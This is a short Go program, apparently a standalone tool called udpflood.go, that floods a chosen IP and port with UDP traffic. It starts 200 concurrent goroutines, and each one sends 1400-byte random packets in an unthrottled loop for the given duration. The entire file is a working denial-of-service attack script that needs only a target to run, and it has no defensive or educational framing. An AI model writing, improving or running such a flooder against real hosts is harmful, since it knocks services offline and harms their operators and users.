package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func flood(target string, port int, duration int, wg *sync.WaitGroup) {
	defer wg.Done()

	raddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		return
	}
	defer conn.Close()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	packetSize := 1400
	payload := make([]byte, packetSize)
	rand.Read(payload)

	sentPackets := 0
	sentBytes := 0

	for time.Now().Before(endTime) {
		_, err := conn.Write(payload)
		if err != nil {
			continue
		}
		sentPackets++
		sentBytes += packetSize
	}

	fmt.Printf("Thread done: Sent %d packets (%d bytes) to %s:%d\n", sentPackets, sentBytes, target, port)
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run udpflood.go [IP] [PORT] [DURATION]")
		return
	}

	target := os.Args[1]
	port, err1 := strconv.Atoi(os.Args[2])
	duration, err2 := strconv.Atoi(os.Args[3])
	if err1 != nil || err2 != nil {
		fmt.Println("Invalid port or duration")
		return
	}

	rand.Seed(time.Now().UnixNano())
	threads := 200

	var wg sync.WaitGroup
	wg.Add(threads)

	start := time.Now()

	for i := 0; i < threads; i++ {
		go flood(target, port, duration, &wg)
	}

	wg.Wait()

	elapsed := time.Since(start)
	fmt.Printf("All threads completed in %v\n", elapsed)
}
